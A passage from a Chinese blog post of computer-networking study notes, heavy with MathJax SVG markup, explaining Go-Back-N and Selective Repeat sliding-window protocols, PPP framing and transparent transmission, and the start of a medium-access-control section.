285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>为停止-等待协议SW。 </p><p><strong>对于发送过程无差错情况</strong>：</p><img src="/posts/e255a10a/3.5.2.4.png" class="" title="无差错情况"><p>发送方将序号落在发送窗口内的0~4号数据分组，依次连续发送出去。分组经过互联网传输正确到达接收方，没有乱序和误码，接收方按序接收它们，每接收一个，接收窗口就向前滑动一个位置，并给发送方发送针对所接收分组的确认分组，在通过互联网的传输正确到达了发送方。发送方每接收一个，发送窗口就向前滑动一个位置，这样就有新的序号落入发送窗口，发送方可以将收到确认的数据分组从缓存中删除了，而接收方可以择机将已接收的数据分组交付上层处理。</p><p>累计确认：接收方不一定要对收到的数据分组逐个发送确认，而可以在收到几个数据分组后(由具体实现)，对按序到达的最后一个数据分组发送确认，ACKn表示序号为n及以前的所有数据分组都已正确接收。比如即使 ACK1丢失了，也有ACK4来确认，发送方也可能不必重传。</p><ul><li>累计确认的优点：减少接收方的开销，减少对网络资源的占用。</li><li>累计确认的缺点：不能向发送方及时发送接收方正确接受数据分组的信息。</li></ul><p><strong>对于有差错情况</strong>：</p><img src="/posts/e255a10a/3.5.2.5.png" class="" title="有差错情况"><img src="/posts/e255a10a/3.5.2.6.png" class="" title="有差错情况"><p>在传输过程中，5号数据分组出现错误，接收方在接收5号分组时通过其检错码发现了错误，于是丢弃该分组。而后续到达的分组通过对比序号发现序号不匹配，接收方就选择不接受它们，将它们丢弃，并且回传按序接受的最后一个正确数据分组，发送ACK4，每丢弃一个分组就发送一个最后正确数据分组信号。</p><img src="/posts/e255a10a/3.5.2.7.png" class="" title="有差错情况"><p>在本例中，尽管序号为6,7,0,1的数据分组正确到达接收方，但由于5号数据分组误码不被接受，它们也“受到牵连”而不被接受。发送方还要重传这些数据分组，这就是所谓的 Go-back-N (回退N帧)。可见，当通信线路质量不好时，回退N帧协议的信道利用率并不比停止-等待协议高。</p><p>回退N帧协议在流水线传输的基础上利用发送窗口来限制发送方连续发送数据分组的数量，是一种连续自动重传请求(ARQ，Automatic Repeat-reQuest)协议。在协议的工作过程中发送窗口和接收窗口不断向前滑动，因此这类协议又称为滑动窗口协议。</p><img src="/posts/e255a10a/3.5.2.8.png" class="" title="超过Wt范围上限"><p>在实际传输过程中，假设所有的分组都被接收，此时发送一个ACK7，但是ACK7在传输过程中丢失。此时发送方到一定时间后触发超时重传机制，重新发送0~7编号分组。此时接送方接收到后，会比对分组序号，发现分组序号符合当前窗口选择接收。但是此时0~7分组实际上已经接收过了，出现了分组重复差错。</p><img src="/posts/e255a10a/3.5.2.9.png" class="" title="GBN"><p>回退N帧协议的缺点：一个数据分组的误码就会导致其后续多个数据分组不能被接收方接收而丢弃，尽管它们没有误码。这必然会导致发送方对这些数据分组的超时重传，对通信资源造成极大浪费。基于此，为了进一步提高传输性能，就提出了选择重传协议SR。</p><h4 id="3-5-2-3-选择重传协议-SR，Selective-Request"><a href="#3-5-2-3-选择重传协议-SR，Selective-Request" class="headerlink" title="3.5.2.3 选择重传协议(SR，Selective Request)"></a>3.5.2.3 选择重传协议(SR，Selective Request)</h4><p>为了进一步提高性能，可设法只重传出现误码的数据分组。因此，接收窗口的尺寸<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex" xmlns="http://www.w3.org/2000/svg" width="3.538ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 1563.7 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g></g></g></svg></mjx-container>不应再等于1(而应大于1)，以便接收方先收下失序到达但无误码并且序号落在接收窗口内的那些数据分组，等到所缺分组收齐后再一并送交上层。这就是选择重传协议。</p><p>注意：选择重传协议为了使发送方仅重传出现差错的分组，接收方不再采用累计确认，而需要对每个正确接收到的数据分组进行逐一确认。</p><ol><li>使用3个比特给分组编序号，0~7</li><li>发送窗口的尺寸<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="3.45ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1524.8 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g></g></g></svg></mjx-container>取值：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="16.631ex" height="2.224ex" role="img" focusable="false" viewBox="0 -833.2 7350.9 983.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(777.8,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="msub" transform="translate(1833.6,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="mo" transform="translate(3636.1,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="msup" transform="translate(4691.9,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(533,363) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(5850.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(6850.9,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>，本例取<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="7.598ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 3358.4 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="mo" transform="translate(1802.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2858.4,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg></mjx-container></li><li>接收窗口<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex" xmlns="http://www.w3.org/2000/svg" width="3.538ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 1563.7 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g></g></g></svg></mjx-container>的取值：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex" xmlns="http://www.w3.org/2000/svg" width="14.153ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 6255.6 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g><g data-mml-node="mo" transform="translate(1841.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2897.2,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(977,-150) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="mo" transform="translate(4699.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(5755.6,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg></mjx-container></li></ol><p>选择重传协议的基本流程：</p><ol><li><p>发送方将发送窗口内分组0123发送给接收方，且此时2号分组出现丢失。</p><img src="/posts/e255a10a/3.5.2.10.png" class="" title="SR"></li><li><p>接收方能正确接收0，1序号分组，并且发送ACK0，ACK1。并且此时接收窗口向前滑动。</p><img src="/posts/e255a10a/3.5.2.11.png" class="" title="SR"></li><li><p>接收方接收3号数据分组，并且发送ACK3，但是由于此时2号分组没有收到，不能向后滑动窗口，只能继续接收剩余窗口。此时发送方会对发送窗口中的3号数据做已确认标记，防止超时重发。</p><img src="/posts/e255a10a/3.5.2.12.png" class="" title="SR"></li><li><p>此时发送方收到ACK0，ACK1将窗口向后滑动，并且将4，5号数据发送出去。</p></li><li><p>接收方接收到4，5号分组后，回传ACK4，ACK5。</p><img src="/posts/e255a10a/3.5.2.13.png" class="" title="SR"></li><li><p>2号数据触发超时重传机制，此时将2号数据发送过去，接收方接收到后回传ACK2，并且此接收方有序并且已确认分组已经连续，向后滑动窗口。</p></li><li><p>发送方接收到ACK2信号后，所有发送窗口都满足确认，并且已经连续，发送窗口也向后滑动。</p></li><li><p>重复上述过程，直至完成所有分组的传输。</p></li></ol><p>如果发送窗口和接收窗口超过了取值范围，就会使接收方无法区分新、旧数据分组，进而出现分组重复这种差错。</p><img src="/posts/e255a10a/3.5.2.15.png" class="" title="分组重复"><img src="/posts/e255a10a/3.5.2.16.png" class="" title="SR总结"><h2 id="3-6-点对点协议-PPP"><a href="#3-6-点对点协议-PPP" class="headerlink" title="3.6 点对点协议(PPP)"></a>3.6 点对点协议(PPP)</h2><p>点对点协议(PPP，Point-to-Point Protocol)是目前使用最广泛的点对点数据链路层协议。</p><p>PPP协议是数据链路层使用的一种协议，它的特点是：简单；只检测差错，而不是纠正差错；不使用序号，也不进行流量控制；可同时支持多种网络层协议。</p><p>PPP协议为在点对点链路传输各种协议数据报提供了一个标准方法，主要由以下三部分构成：</p><ul><li>对各种协议数据报的封装方法(封装成帧)</li><li>链路控制协议(LCP)：用于建立、配置以及测试数据链路的连接</li><li>一套网络控制协议(NCPs)：其中的每一个协议支持不同的网络层协议</li></ul><h3 id="3-6-1-PPP的帧格式"><a href="#3-6-1-PPP的帧格式" class="headerlink" title="3.6.1 PPP的帧格式"></a>3.6.1 PPP的帧格式</h3><img src="/posts/e255a10a/3.5.3.1.png" class="" title="PPP的帧格式"><h3 id="3-6-2-点对点协议透明传输"><a href="#3-6-2-点对点协议透明传输" class="headerlink" title="3.6.2 点对点协议透明传输"></a>3.6.2 点对点协议透明传输</h3><p>PPP实现透明传输的两种方法：</p><ul><li>面向字节的异步链路采用插入转义字符的字节填充法</li><li>面向比特的同步链路采用插入比特 0 的比特填充法</li></ul><img src="/posts/e255a10a/3.5.3.2.png" class="" title="异步链路透明传输"><img src="/posts/e255a10a/3.5.3.3.png" class="" title="同步链路透明传输"><h3 id="3-6-3-差错检测"><a href="#3-6-3-差错检测" class="headerlink" title="3.6.3 差错检测"></a>3.6.3 差错检测</h3><img src="/posts/e255a10a/3.5.3.4.png" class="" title="差错检测"><h3 id="3-6-4-工作状态"><a href="#3-6-4-工作状态" class="headerlink" title="3.6.4 工作状态"></a>3.6.4 工作状态</h3><img src="/posts/e255a10a/3.5.3.5.png" class="" title="工作状态"><h2 id="3-7-媒体接入控制-MAC"><a href="#3-7-媒体接入控制-MAC" class="headerlink" title="3.7 媒体接入控制(MAC)"></a>3.7 媒体接入控制(MAC)</h2><h3 id="3-7-1-基本概念"><a href="#3-7-1-基本概念" class="headerlink" title="3.7.1 基本概念"></a>3.7.1 基本概念</h3><p>数据媒体接入控制(MAC，Medium Access Control)，其要着重考虑的问题就是如何协调多个发送和接收站对一个个共享传输媒体的占用，也就是解决冲突的问题。</p><img src="/posts/e255a10a/3.5.4.1.png" class="" title="MAC"><p>随着技术的发展，交换技术的成熟和成本的降低，具有更高性能的使用点对点链路和链路层交换机的交换式局域网在有线领域已完全取代了共享式局域网，但由于无线信道的广播天性，无线局域网仍然使用的是共享媒体技术。</p><h3 id="3-7-2-静态划分信道"><a href="#3-7-2-静态划分信道" class="headerlink" title="3.7.2 静态划分信道"></a>3.7.2 